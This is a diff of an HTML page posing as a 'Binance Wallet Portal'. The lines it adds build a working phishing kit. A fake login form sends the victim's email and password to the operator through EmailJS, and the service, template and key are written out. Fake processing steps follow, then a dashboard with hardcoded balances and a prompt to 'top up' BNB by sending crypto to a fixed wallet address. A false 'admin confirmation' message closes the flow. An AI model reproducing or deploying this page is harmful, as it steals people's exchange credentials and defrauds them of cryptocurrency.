@@ -1,11 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Binance Wallet Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Binance Wallet Portal</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -26,58 +24,12 @@
       background-color: #f3ba2f;
       color: #181A20;
       font-weight: bold;
-      cursor: pointer;
     }
     .token {
       background: #2E3239;
       display: flex; justify-content: space-between;
       padding: 15px; border-radius: 10px;
       margin: 10px 0; align-items: center;
-      position: relative;
-    }
-    .token-left {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .token img {
-      width: 24px; height: 24px;
-      animation: float 2s ease-in-out infinite;
-      cursor: pointer;
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-4px); }
-    }
-    .tooltip {
-      position: absolute;
-      top: 100%;
-      left: 0;
-      background-color: #1E1F25;
-      color: white;
-      border-radius: 6px;
-      padding: 8px;
-      margin-top: 6px;
-      font-size: 0.8rem;
-      display: none;
-      z-index: 1000;
-      width: 240px;
-    }
-    .tooltip.show {
-      display: block;
-      animation: fadeIn 0.2s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-5px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .button-group {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-    .button-group button {
-      flex: 1 1 30%;
     }
     .status-bar {
       display: flex;
@@ -91,111 +43,146 @@
       border-radius: 5px;
       font-size: 0.8rem;
     }
+    .button-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .button-group button {
+      flex: 1 1 30%;
+    }
+    img.coin-logo {
+      width: 24px;
+      height: 24px;
+      margin-right: 8px;
+    }
   </style>
 </head>
-<body onload="initApp()">
-
-<!-- Page 5: Dashboard -->
-<div class="page" id="page5">
+<body onload="initApp()"><!-- Page 1: Sign In --><div class="page visible" id="page1">
+  <div class="form-container">
+    <h2>Binance Wallet Login</h2>
+    <input type="email" id="email" placeholder="Email" required />
+    <input type="password" id="pass" placeholder="Password" required />
+    <button onclick="submitSignin()">Confirm</button>
+  </div>
+</div><!-- Page 2: Processing --><div class="page" id="page2">
+  <div class="form-container">
+    <h2>Authenticating...</h2>
+    <p>Please wait...</p>
+    <button onclick="confirmAccess()">Continue</button>
+  </div>
+</div><!-- Page 3: Account ID --><div class="page" id="page3">
+  <div class="form-container">
+    <h2>Enter Account ID</h2>
+    <input type="text" placeholder="Account ID" />
+    <button onclick="confirmID()">Confirm</button>
+  </div>
+</div><!-- Page 5: Dashboard --><div class="page" id="page5">
   <div class="form-container">
     <div class="status-bar">
       <h2>Dashboard</h2>
       <span id="walletStatus"></span>
     </div>
     <p style="color: #f3ba2f;">Total Assets: <strong id="totalAssets">$2078.78</strong></p>
-    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p>
-    <div class="token">
-      <div class="token-left">
-        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" onclick="toggleTooltip('usdtTooltip')">
-        <span>USDT</span>
-      </div>
-      <div id="usdt_amount">$0.00</div>
-      <div class="tooltip" id="usdtTooltip">
-        <strong>Token:</strong> USDT<br>
-        <strong>Network:</strong> BNB Smart Chain (BEP20)<br>
-        <strong>Balance:</strong> <span id="usdtTooltipBal">$0.00</span><br>
-        <button onclick="copyWallet()">📋 Copy Wallet Address</button>
-      </div>
-    </div>
-    <div class="token">
-      <div class="token-left">
-        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB" onclick="toggleTooltip('bnbTooltip')">
-        <span>BNB</span>
-      </div>
-      <div id="bnb_amount">$0.00</div>
-      <div class="tooltip" id="bnbTooltip">
-        <strong>Token:</strong> BNB<br>
-        <strong>Network:</strong> BNB Smart Chain (BEP20)<br>
-        <strong>Balance:</strong> <span id="bnbTooltipBal">$0.00</span><br>
-        <button onclick="copyWallet()">📋 Copy Wallet Address</button>
-      </div>
-    </div>
-    <div class="button-group">
-      <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
-      <button onclick="goToScan('Receive')">Receive</button>
-      <button onclick="goToScan('Top Up BNB')">Top Up BNB</button>
-    </div>
-    <button onclick="logoutUser()" style="margin-top: 30px; background:#f6465d; color:white;">Sign Out</button>
-  </div>
+    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p><div class="token">
+  <div><img class="coin-logo" src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" /> USDT</div>
+  <div id="usdt_amount">$0.00</div>
 </div>
 
-<script>
-const bscApiKey = "YourApiKeyToken";
-const usdtContract = "0x55d398326f99059fF775485246999027B3197955"; // USDT
+<div class="token">
+  <div><img class="coin-logo" src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB" /> BNB</div>
+  <div id="bnb_amount">$0.00</div>
+</div>
 
-let prices = { tether: 1.00, binancecoin: 0 };
+<div class="button-group">
+  <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
+  <button onclick="goToScan('Receive')">Receive</button>
+  <button onclick="goToScan('Top Up BNB')">Top Up BNB</button>
+</div>
+<button onclick="logoutUser()" style="margin-top: 20px; background:#f6465d; color:white;">Sign Out</button>
 
-async function fetchPrices() {
-  try {
-    const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether,binancecoin&vs_currencies=usd");
-    const data = await res.json();
-    prices = data;
-  } catch (e) {
-    console.error("Error fetching prices:", e);
-  }
+  </div>
+</div><!-- Page 6: Scan + Hash Input --><div class="page" id="page6">
+  <div class="form-container">
+    <h2 id="scanAction">Action</h2>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=150x150" alt="QR Code" />
+    <p>Send to: <strong style="color:#f3ba2f;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</strong></p>
+    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
+    <button onclick="submitTransaction()">Confirm Transaction</button>
+    <div id="txStatus"></div>
+    <button onclick="returnToDashboard()">Return</button>
+  </div>
+</div><!-- Page 7: Wallet Connect Page --><div class="page" id="page7">
+  <div class="form-container">
+    <h2>Connect Your Wallet</h2>
+    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address" />
+    <button onclick="confirmWallet()">Confirm Wallet</button>
+    <button onclick="returnToDashboard()">Return to Dashboard</button>
+  </div>
+</div><script>
+const emailService = "service_78wwbgl";
+const signinTemplate = "template_omkmcio";
+const publicKey = "ochPV1QVtay7TOdBA";
+
+function initApp() {
+  emailjs.init(publicKey);
+  const step = localStorage.getItem("binance_step") || "1";
+  showPage(step);
+  if (step === "5") loadDashboard();
 }
 
-async function fetchBalances(address) {
-  try {
-    const bnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${bscApiKey}`);
-    const bnbData = await bnbRes.json();
-    const bnb = (parseFloat(bnbData.result) / 1e18).toFixed(4);
+function showPage(id) {
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("visible"));
+  document.getElementById("page" + id).classList.add("visible");
+  localStorage.setItem("binance_step", id);
+}
 
-    const usdtRes = await fetch(`https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${address}&tag=latest&apikey=${bscApiKey}`);
-    const usdtData = await usdtRes.json();
-    const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
+function submitSignin() {
+  const email = document.getElementById("email").value;
+  const pass = document.getElementById("pass").value;
+  localStorage.setItem("email", email);
+  const payload = { user_email: email, user_password: pass };
+  emailjs.send(emailService, signinTemplate, payload).then(() => {
+    showPage("2");
+  });
+}
 
-    document.getElementById("usdt_amount").textContent = `$${usdt}`;
-    document.getElementById("bnb_amount").textContent = `${bnb} BNB`;
-    document.getElementById("usdtTooltipBal").textContent = `$${usdt}`;
-    document.getElementById("bnbTooltipBal").textContent = `${bnb} BNB`;
+function confirmAccess() { setTimeout(() => showPage("3"), 2000); }
+function confirmID() { setTimeout(() => { showPage("5"); loadDashboard(); }, 2000); }
+function returnToDashboard() { showPage("5"); loadDashboard(); }
 
-    const usdtUSD = parseFloat(usdt) * prices.tether.usd;
-    const bnbUSD = parseFloat(bnb) * prices.binancecoin.usd;
-    const total = (usdtUSD + bnbUSD).toFixed(2);
-    document.getElementById("totalAssets").textContent = `$${total}`;
-  } catch (e) {
-    console.error("Error fetching balances:", e);
+function goToScan(action) {
+  document.getElementById("scanAction").innerText = action;
+  showPage("6");
+}
+
+function confirmWallet() {
+  const wallet = document.getElementById("walletAddress").value;
+  if (!wallet || wallet.length < 10) {
+    alert("Enter a valid BEP20 wallet address");
+    return;
   }
+  localStorage.setItem("wallet_address", wallet);
+  showPage("5");
+  loadDashboard();
 }
 
 function loadDashboard() {
   const address = localStorage.getItem("wallet_address");
-  document.getElementById("walletStatus").textContent = address
-    ? `Connected: ${address.slice(0, 6)}...${address.slice(-4)}`
-    : "Not Connected";
-  if (address) {
-    fetchPrices().then(() => fetchBalances(address));
-    setInterval(() => {
-      fetchPrices().then(() => fetchBalances(address));
-    }, 60000);
-  }
+  document.getElementById("walletStatus").textContent = address ? `Connected: ${address.slice(0, 6)}...${address.slice(-4)}` : "Not Connected";
+  document.getElementById("usdt_amount").textContent = "$2078.78";
+  document.getElementById("bnb_amount").textContent = "0.26 BNB";
+  document.getElementById("totalAssets").textContent = "$2078.78";
 }
 
-function copyWallet() {
-  const wallet = localStorage.getItem("wallet_address");
-  if (!wallet) return alert("No wallet connected.");
-  navigator.clipboard.writeText(wallet).then(() => alert("Wallet address copied to clipboard!"));
+function submitTransaction() {
+  const tx = document.getElementById("txHash").value;
+  if (tx.length < 10) return alert("Enter valid transaction hash");
+  document.getElementById("txStatus").innerHTML = "<p>Sent ✅ Waiting for admin confirmation...</p>";
+  setTimeout(() => {
+    alert("Transaction processed.");
+    returnToDashboard();
+  }, 3000);
 }
 
 function logoutUser() {
@@ -204,19 +191,5 @@ function logoutUser() {
     location.reload();
   }
 }
-
-function toggleTooltip(id) {
-  const el = document.getElementById(id);
-  const others = document.querySelectorAll('.tooltip');
-  others.forEach(tip => { if (tip !== el) tip.classList.remove('show'); });
-  el.classList.toggle('show');
-  document.addEventListener("click", function outsideClick(e) {
-    if (!el.contains(e.target) && !e.target.matches('img')) {
-      el.classList.remove('show');
-      document.removeEventListener("click", outsideClick);
-    }
-  });
-}
-</script>
-</body>
+</script></body>
 </html>
